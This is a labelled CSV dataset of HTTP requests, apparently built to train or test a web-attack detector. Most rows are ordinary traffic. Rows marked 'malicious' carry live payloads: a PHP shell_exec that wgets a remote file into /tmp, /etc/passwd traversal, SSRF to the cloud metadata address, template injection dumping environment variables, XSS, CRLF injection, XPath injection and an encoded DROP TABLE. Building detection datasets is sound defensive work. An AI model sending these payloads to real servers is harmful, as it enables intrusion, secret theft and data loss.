label,text
benign,"POST /account/security/change-password HTTP/1.1
Host: verified-payments.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/114.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Content-Length: 140
Connection: keep-alive
Referer: https://verified-payments.org/account/security
Cookie: auth_token=28ad98b9f7e3412f8a1b64fc

csrf_token=33d8feac8394a29e4b3db81a&form_id=changePassword&timestamp=1686134800&old_password=oldpass123&new_password=Str0ngPass!2024&return_url=%2Faccount%2Fdashboard"
benign,"GET /themes/dark-theme.css HTTP/1.1
Host: my-personal-blog-site.info
If-None-Match: W/""d3adb33f-101""
Accept: text/css,*/*;q=0.1
Accept-Encoding: br, gzip
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
malicious,"GET /api/file:///C:/Users/Public/Documents/config.ini HTTP/1.1
Host: analytics.fintech-solutions.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/xml
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
malicious,"POST /user-profile/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 116
Connection: close

bio=Creative+content+maker.%20<?php%20echo%20shell_exec%28%27wget%20http%3A%2F%2Fflarezone-inner.net%2Fpayload.php%20-O%20%2Ftmp%2Fnshell.php%27%29%3B%20%3F%3E"
benign,"PUT /api/finance/accounts/3321 HTTP/1.1
Host: secure-finance-db.compliance-portal.biz
Authorization: Bearer wksENOV9mhT2Za5F4XC7LpGytld83MqURS0JP6Dw
Content-Type: application/json
Accept: application/json
User-Agent: Python-httplib2/0.20.4 (gzip)
Accept-Encoding: gzip, deflate
Connection: keep-alive

{""accountId"":3321,""ownerName"":""Thomas K. Henderson"",""accountType"":""checking"",""balance"":12548.17,""currency"":""USD"",""status"":""active""}"
benign,"GET /profile/settings/privacy HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: https://secure-user-portal.net/dashboard
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
Cookie: session_id=xyz789abc123; theme=light"
malicious,"GET /reports/annual HTTP/1.1
Host: financial-analytics.ai
X-Forwarded-For: 198.51.100.23%0d%0aX-Injected-Header:%20InjectedValue
User-Agent: Mozilla/5.0%20(X11;%20Linux%20x86_64;%20rv:89.0)%20Gecko/20100101%20Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br"
benign,"GET /accounts/profile?id=8 HTTP/1.1
Host: enterprise-dashboard.net
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: close
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fedu-platform.ai%2Fcourses%2Fdata-science%2Fmodules%2Fintro HTTP/1.1
Host: api.edu-platform.ai
Accept: application/json
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /post-sitemap.xml HTTP/1.1
Host: urban-nomad-blog.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept: text/xml, application/xml
Accept-Language: en-GB,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /api/v1/orders/details?id=1024&status=completed&page=2 HTTP/1.1
Host: fast-shop-central.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://fast-shop-central.io/dashboard/orders
Cookie: session_token=Gh78409dJ3QwZ8Lp; pref_lang=en"
benign,"GET /data/api/fetchMetadata?url=https%3A%2F%2Fmy-personal-blog-site.info%2Fposts%2Ftravel-paris HTTP/1.1
Host: data.my-personal-blog-site.info
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
benign,"PUT /users/4532/profile-picture HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer NjAxMjM0NTZBQkNERUZH
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
X-CSRF-Token: e9a3d45f8bf923c122d56a9a43123dd7
Content-Length: 198
Connection: keep-alive

{""userId"":4532,""avatar_thumbnail_b64"":""iVBORw0KGgoAAAANSUhEUgAAAC8AAAA8CAYAAAA33FmfAAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABwESAAMAAAABAAEAAIdpAAQAAAABAAABEqAAAAAAAAABaAAAAAADW6hJrAAABFUlEQVRYw+3XwQ2AIAwF0P//P2llMyOE7AQKuF46ZCq6Q6yDm0+74HxAICLB7nDdeekWyASC1jUKPYZKZTEBcGUMT/TjyAlEa6rbKVbq98/1weBy2x0FkANRMUIVprB3pmKjnDHphgDBrK87ftY6/wD0q8ntAYt7kLgAEv7PRxR6CNQ2DQwgAAQUFE1NU0rMkhIIHwZAAeMbQBAQEEO0Nb5AFkJDhCSAQISLtFvpJaRVF3fpM1o8EX0UXfKiI9rQIgZrpvqlauka6okjpS032qUklwqEf6fIUT7Dw1HTy6JgAAAABJRU5ErkJggg==""}"
malicious,"POST /render/api/convert HTTP/1.1
Host: fast-image-conversion.cloud-tools.site
User-Agent: Python-urllib/3.8
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 92

imageUrl=http%3A%2F%2Fcdn.assets-gallery.info%2Fimages%2Fphoto.jpg&format=png&imageUrl=http%3A%2F%2F169.254.169.254%2Fadmin%2Fsettings"
benign,"POST /auth/v3/reset-password-request HTTP/1.1
Host: secure-login-hub.net
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://secure-login-hub.net/login
Connection: close

{""email"": ""sophia.jensen@secure-login-hub.net""}"
benign,"DELETE /v1/resource-groups/6654e908a7 HTTP/1.1
Host: service-backend.api-platform.io
Authorization: Bearer 7nm34v29cbq82ka7ndca5g1dksb4zmxr
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/json
Via: 1.1 varnish
Connection: keep-alive"
benign,"HEAD /index.html HTTP/1.1
Host: events-management-hub.io
Accept: */*
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Referer: https://events-management-hub.io/login
Connection: close"
benign,"GET /static/v4/css/main.css?ver=12.4.2&note=param%3DHello%2520World HTTP/1.1
Host: assets.secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /images/logo.svg HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G988U Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/page/home
Connection: keep-alive"
benign,"GET /v1/fetch?url=https%3A%2F%2Fmedia-streaming-platform.tv%2Fwatch%2Fepisode%2F134 HTTP/1.1
Host: api.media-streaming-platform.tv
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /documents/whitepaper2024_v2.docx HTTP/1.1
Host: tech-insights-consultancy.biz
Accept: application/vnd.openxmlformats-officedocument.wordprocessingml.document
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230505.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Range: bytes=0-1023
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/v3/items/search?query=wireless+headphones&id=1024&limit=25 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.79.1
Accept: application/json
Connection: close"
malicious,"GET /static/%2E%2E/%2E%2E/%2E%2E/etc/passwd HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: close"
malicious,"PATCH /v1/accounts/profile HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJjMTIzIiwiZXhwIjoxNjgyOTE2MjAwfQ.44abJ7NCigCkRpQ7uVenQChV9NVtp1KTmLXSU7cxhNs
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
Referer: https://online-retail-store.biz/account/settings
Accept-Language: en-US,en;q=0.8

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""shipping_address"": ""1234 Forbidden Str""
  },
  ""account_info"": {
    ""subscription_level"": ""silver"",
    ""override_settings"": {
      ""credits_override"": 99999,
      ""is_feature_xyz_enabled"": true
    }
  }
}"
malicious,"GET /account/view/<ImG SrC=x OnErRoR=prompt(document.domain)> HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"GET /comments/recent?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: insights.feedback-platform.net
Accept: text/html
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: close
Upgrade-Insecure-Requests: 1"
malicious,"PUT /api/v5/redirect HTTP/1.1
Host: tech-support-helpdesk.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/plain
Accept-Language: en-US,en;q=0.6
Content-Type: application/json
Content-Length: 280
Referer: https://tech-support-helpdesk.ai/dashboard
Cookie: auth_token=token12345abcdef67890

{""redirect_url"": ""/helpdesk/home%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://phishing.tech-support-helpdesk.ai%0d%0a%0d%0a<html><body>Redirecting...</body></html>""}"
malicious,"PATCH /api/v3/items/search HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZGV2dXNlciIsImFkbWluIjpmYWxzZX0.3v2k9XkLzD4B1N6U0RqJTYx9cEwY5owhXz9kJfLs2Qw
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0

{""user_details"":{""name"":""attacker"",""address"":""123 evil st""},""account_info"":{""subscription_level"":""premium"",""override_settings"":{""is_feature_xyz_enabled"":true,""credits_override"":99999}}}"
malicious,"GET /dashboard/%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27env%27).read()%7D%7D/ HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
benign,"POST /profile/contact HTTP/1.1
Host: tech-support-hub.io
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--Bnd1324Q
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Content-Length: 172

----Bnd1324Q
Content-Disposition: form-data; name=""userName""

support_agent_92
----Bnd1324Q
Content-Disposition: form-data; name=""subject""

Issue with resetting password
----Bnd1324Q
Content-Disposition: form-data; name=""details""

User unable to receive reset email since yesterday morning.
----Bnd1324Q--"
malicious,"POST /api/system/log HTTP/1.1
Host: online-retail-store-central.api.biz
Content-Type: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Cache-Control: max-age=0
Content-Length: 275
Connection: close

{""order_ref"": ""ORD12345"", ""event_details"": ""Payment received\"", \""payment_status\"": 200, \""account\"": \""admin\"", \""privilege_flag\"": true, \""notes\"": \""Transaction logged""}"
benign,"POST /settings/email/preferences HTTP/1.1
Host: notifications.email-manage.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Connection: close
Referer: https://notifications.email-manage.net/settings/email

newsletter_subscribe=no&promo_emails=yes%26offers%23alerts=on"
benign,"POST /submit/form HTTP/1.1
Host: form-data-collector.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://form-data-collector.biz/forms/entry
Cache-Control: no-cache
Connection: close

product=Eco%20Friendly%20Bottle&description=Materials%20are%20100%25%20recyclable%20%26%20durable%20%23green&quantity=12&notes=Ship%20before%205%25%20discount"
benign,"POST /api/v1/payment/process HTTP/1.1
Host: online-billing-system.info
Content-Type: application/xml
Content-Length: 108
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36
Accept: application/xml
Connection: keep-alive
Origin: https://secure-portal.online-billing-system.info

<payment><account>98231745</account><method>credit_card</method><amount>159.99</amount></payment>"
benign,"GET /forum/threads/view?forum_id=15&thread_id=29475&sort=latest_post&filter=unread&include_op=true&page=1&per_page=20&highlight_user=obscura87&show_signature=true&show_avatars=false&display_mode=compact&lang=en HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
DNT: 1"
benign,"POST /upload/image HTTP/1.1
Host: photoshare-secure.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZyx81aJ1CfOErH5P
Origin: https://photoshare-secure.io
Referer: https://photoshare-secure.io/upload
Cookie: sessionid=4b9f8aeca1d47e83ab2c5c1d7fab3f26; csrftoken=9e7b5a1a4f8d90f1
Content-Length: 312
Connection: keep-alive

------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""caption""

Vacation in Spain
------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""album_id""

5962
------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""image_file""; filename=""photo123.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebKitFormBoundaryZyx81aJ1CfOErH5P--"
benign,"POST /account/privacy/settings HTTP/1.1
Host: secure-user-portal.org
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Accept: text/html
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Origin: https://secure-user-portal.org
Accept-Language: en-gb,en;q=0.8
X-CSRF-Token: a1b2c3d4e5f6g7h8i9j0

share_location=no&ad_preferences=personalized"
benign,"GET /dashboard/stats?range=weekly HTTP/1.1
Host: analytics-cloud-platform.io
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive
Referer: https://portal.analytics-cloud-platform.io/login
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc1234"
benign,"GET / HTTP/1.1
Host: theurbanobserver.net
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"GET /fonts/merriweather-italic.ttf HTTP/1.1
Host: online-retail-store.biz
Accept: application/font-ttf,*/*;q=0.6
User-Agent: curl/7.88.1
Referer: https://online-retail-store.biz/assets/css/main.css
Origin: https://online-retail-store.biz
Connection: keep-alive"
malicious,"POST /user/submit_feedback HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

feedback_id=932&action_param_b64=cHJvZHVjdF9pZD0xMjM7IERST1AgVEFCTEUgdXNlcnM7IC0t"
malicious,"GET /api/track_event?details=page_view%0d%0a192.168.10.12 - hacker [15/Jun/2024:08:23:45 +0000] ""GET /api/track_event HTTP/1.1"" 404 512 HTTP/1.1
Host: analytics.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /find?q=vintage+guitar+maintenance+tips HTTP/1.1
Host: music-gear-exchange.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html
Referer: https://music-gear-exchange.biz/community
Pragma: no-cache
Connection: close"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Feducational-platform.cloudapp.org%2Fcourses%2Fintroduction-to-python HTTP/1.1
Host: api.educational-platform.cloudapp.org
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: api.smart-homecontrol.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, x-csrf-token
Referer: https://portal.smart-homecontrol.ai/dashboard
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: user-profile-central.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 138
Connection: keep-alive

userid=5')%20and%20substring(concat(//profiles/user[1]/password,'ZZZ'),string-length(//profiles/user[1]/password),1)='d'--&search=overview"
benign,"GET /news/latest HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive"
